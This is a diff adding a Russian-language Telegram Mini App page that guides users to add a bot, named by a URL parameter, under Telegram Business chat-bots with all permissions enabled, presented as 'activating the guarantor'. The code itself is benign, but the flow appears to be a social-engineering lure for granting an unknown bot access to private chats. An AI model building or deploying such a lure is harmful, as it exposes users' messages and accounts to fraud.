@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Connect Telegram Business</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="app">
+        <header>
+            <h1>Подключение Business</h1>
+            <p>Следуйте инструкциям для активации гаранта</p>
+        </header>
+
+        <div class="stepper">
+            <div class="step active" id="step1">
+                <div class="step-icon">1</div>
+                <div class="step-content">
+                    <h3>Откройте Настройки</h3>
+                    <p>Перейдите в главный раздел настроек вашего Telegram аккаунта.</p>
+                </div>
+            </div>
+
+            <div class="step" id="step2">
+                <div class="step-icon">2</div>
+                <div class="step-content">
+                    <h3>Telegram Business</h3>
+                    <p>Найдите и откройте раздел <b>Telegram Business</b>.</p>
+                </div>
+            </div>
+
+            <div class="step" id="step3">
+                <div class="step-icon">3</div>
+                <div class="step-content">
+                    <h3>Чат-боты</h3>
+                    <p>Выберите пункт <b>Чат-боты</b> в списке функций.</p>
+                </div>
+            </div>
+
+            <div class="step" id="step4">
+                <div class="step-icon">4</div>
+                <div class="step-content">
+                    <h3>Добавьте бота</h3>
+                    <p>Нажмите "Добавить" и введите юзернейм нашего бота.</p>
+                    <div class="bot-tag" id="botUsername">@loading...</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-zone">
+            <button id="checkBtn" class="main-button">Проверить подключение</button>
+            <p class="hint">Убедитесь, что все разрешения включены</p>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+
+        // Устанавливаем юзернейм
+        const botUsername = document.getElementById('botUsername');
+        const urlParams = new URLSearchParams(window.location.search);
+        const botName = urlParams.get('bot') || 'вашего бота';
+        botUsername.innerText = '@' + botName;
+
+        const checkBtn = document.getElementById('checkBtn');
+        
+        checkBtn.addEventListener('click', () => {
+            checkBtn.innerText = 'Проверка...';
+            checkBtn.disabled = true;
+            
+            // Отправляем данные обратно боту
+            tg.sendData(JSON.stringify({action: 'check_business_connection'}));
+            
+            setTimeout(() => {
+                tg.close();
+            }, 1000);
+        });
+
+        // Простая анимация шагов при скролле
+        const steps = document.querySelectorAll('.step');
+        window.addEventListener('scroll', () => {
+            steps.forEach((step, idx) => {
+                const rect = step.getBoundingClientRect();
+                if (rect.top < window.innerHeight * 0.7) {
+                    step.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
